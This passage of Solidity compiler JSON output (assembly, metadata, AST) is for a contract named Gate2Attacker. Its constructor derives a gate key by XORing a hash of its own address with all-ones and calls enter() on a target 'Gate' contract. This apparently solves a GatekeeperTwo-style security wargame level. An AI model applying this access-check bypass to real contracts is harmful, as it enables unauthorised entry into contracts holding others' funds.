									"begin": 329,
									"end": 346,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "LT",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "tag",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 329,
									"end": 346,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 329,
									"end": 346,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 142,
									"end": 354,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 111,
									"end": 357,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 111,
									"end": 357,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220adcdf8985306f8ebba6f7c71521d85e3959bbcf273cc8f33875dcb845b7b95e764736f6c634300060c0033",
									".code": [
										{
											"begin": 111,
											"end": 357,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 111,
											"end": 357,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 111,
											"end": 357,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 111,
											"end": 357,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 111,
											"end": 357,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 111,
											"end": 357,
											"name": "REVERT",
											"source": 0
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/GateAttackerLV2.sol\":\"Gate2Attacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/GateAttackerLV2.sol\":{\"keccak256\":\"0x633b7c9df3920894bca23ef687360812fd809f2237d255d6c5e0c637ddd22983\",\"urls\":[\"bzz-raw://668b4f75321be9d8d560e9c2e8fe55c26e529321eec74d0c18f14aaf518038e5\",\"dweb:/ipfs/QmR2Pnnbi8wrF6oLQpUNrgskd8xV8Nn6Ri7k2v5iiK915q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "contract/security/GateAttackerLV2.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "contract/security/GateAttackerLV2.sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contract/security/GateAttackerLV2.sol": {
				"ast": {
					"absolutePath": "contract/security/GateAttackerLV2.sol",
					"exportedSymbols": {
						"Gate": [
							9
						],
						"Gate2Attacker": [
							57
						]
					},
					"id": 58,
					"license": null,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 9,
							"linearizedBaseContracts": [
								9
							],
							"name": "Gate",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "3370204e",
									"id": 8,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enter",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "63:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 2,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "63:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "62:17:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "98:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 5,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "98:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "97:6:0"
									},
									"scope": 9,
									"src": "48:56:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 58,
							"src": "27:80:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 57,
							"linearizedBaseContracts": [
								57
							],
							"name": "Gate2Attacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 55,
										"nodeType": "Block",
										"src": "175:179:0",
										"statements": [
											{
												"assignments": [
													15
												],
												"declarations": [
													{
														"constant": false,
														"id": 15,
														"mutability": "mutable",
														"name": "impl",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 55,
														"src": "186:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Gate_$9",
															"typeString": "contract Gate"
														},
														"typeName": {
															"contractScope": null,
															"id": 14,
															"name": "Gate",
															"nodeType": "UserDefinedTypeName",
															"referencedDeclaration": 9,
															"src": "186:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Gate_$9",
																"typeString": "contract Gate"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 19,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 17,
															"name": "addr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 11,
															"src": "203:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 16,
														"name": "Gate",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 9,
														"src": "198:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_Gate_$9_$",
															"typeString": "type(contract Gate)"
														}
													},
													"id": 18,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "198:10:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Gate_$9",
														"typeString": "contract Gate"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "186:22:0"
											},
											{
												"assignments": [
													21
												],
												"declarations": [
													{
														"constant": false,
														"id": 21,
														"mutability": "mutable",
														"name": "input",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 55,
														"src": "219:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														},
														"typeName": {
															"id": 20,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "219:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 48,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															},
															"id": 46,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"id": 33,
																										"name": "this",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": -28,
																										"src": "290:4:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_contract$_Gate2Attacker_$57",
																											"typeString": "contract Gate2Attacker"
																										}
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_contract$_Gate2Attacker_$57",
																											"typeString": "contract Gate2Attacker"
																										}
																									],
																									"id": 32,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"lValueRequested": false,
																									"nodeType": "ElementaryTypeNameExpression",
																									"src": "282:7:0",
																									"typeDescriptions": {
																										"typeIdentifier": "t_type$_t_address_$",
																										"typeString": "type(address)"
																									},
																									"typeName": {
																										"id": 31,
																										"name": "address",
																										"nodeType": "ElementaryTypeName",
																										"src": "282:7:0",
																										"typeDescriptions": {
																											"typeIdentifier": null,
																											"typeString": null
																										}
																									}
																								},
																								"id": 34,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "typeConversion",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "282:13:0",
																								"tryCall": false,
																								"typeDescriptions": {
																									"typeIdentifier": "t_address",
																									"typeString": "address"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_address",
																									"typeString": "address"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 29,
																								"name": "abi",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": -1,
																								"src": "265:3:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_magic_abi",
																									"typeString": "abi"
																								}
																							},
																							"id": 30,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"memberName": "encodePacked",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": null,
																							"src": "265:16:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																								"typeString": "function () pure returns (bytes memory)"
																							}
																						},
																						"id": 35,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "265:31:0",
																						"tryCall": false,
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					],
																					"id": 28,
																					"name": "keccak256",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": -8,
																					"src": "255:9:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																						"typeString": "function (bytes memory) pure returns (bytes32)"
																					}
																				},
																				"id": 36,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "255:42:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			],
																			"id": 27,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "248:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_bytes8_$",
																				"typeString": "type(bytes8)"
																			},
																			"typeName": {
																				"id": 26,
																				"name": "bytes8",
																				"nodeType": "ElementaryTypeName",
																				"src": "248:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 37,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "248:50:0",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 25,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "241:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 24,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "241:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 38,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "241:58:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "^",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		},
																		"id": 44,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 41,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "310:1:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					}
																				],
																				"id": 40,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "303:6:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint64_$",
																					"typeString": "type(uint64)"
																				},
																				"typeName": {
																					"id": 39,
																					"name": "uint64",
																					"nodeType": "ElementaryTypeName",
																					"src": "303:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 42,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "303:9:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint64",
																				"typeString": "uint64"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "-",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "31",
																			"id": 43,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "315:1:0",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_1_by_1",
																				"typeString": "int_const 1"
																			},
																			"value": "1"
																		},
																		"src": "303:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"id": 45,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "302:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"src": "241:76:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint64",
																"typeString": "uint64"
															}
														],
														"id": 23,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "234:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes8_$",
															"typeString": "type(bytes8)"
														},
														"typeName": {
															"id": 22,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "234:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 47,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "234:84:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "219:99:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 52,
															"name": "input",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 21,
															"src": "340:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 49,
															"name": "impl",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 15,
															"src": "329:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Gate_$9",
																"typeString": "contract Gate"
															}
														},
														"id": 51,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "enter",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 8,
														"src": "329:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bytes8_$returns$_t_bool_$",
															"typeString": "function (bytes8) external returns (bool)"
														}
													},
													"id": 53,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "329:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 54,
												"nodeType": "ExpressionStatement",
												"src": "329:17:0"
											}
										]
									},
									"documentation": null,
									"id": 56,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 11,
												"mutability": "mutable",
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 56,
												"src": "154:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 10,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "154:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "153:14:0"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "175:0:0"
									},
									"scope": 57,
									"src": "142:212:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 58,
							"src": "111:246:0"
						}
					],
					"src": "0:361:0"
				},
				"id": 0
			}
		}
	}
}